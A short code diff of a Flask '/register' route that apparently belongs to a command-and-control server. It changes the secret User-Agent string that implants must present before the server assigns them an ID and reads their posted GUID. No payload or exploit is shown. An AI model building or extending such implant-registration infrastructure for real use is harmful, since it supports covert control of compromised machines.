@@ -86,8 +86,8 @@ def add_request():
 
 @app.route("/register", methods=['POST', 'GET'])
 def addAgent():
-    user_agent = request.user_agent
-    if (user_agent == 'authenticated'):
+    user_agent = str(request.user_agent).strip(" \r\n\t") # thank you windows
+    if (user_agent == 'ny4n_ca1'):
         implant_id = str(uuid.uuid4())
         fromimplant = request.get_json()
         guid = fromimplant['guid']
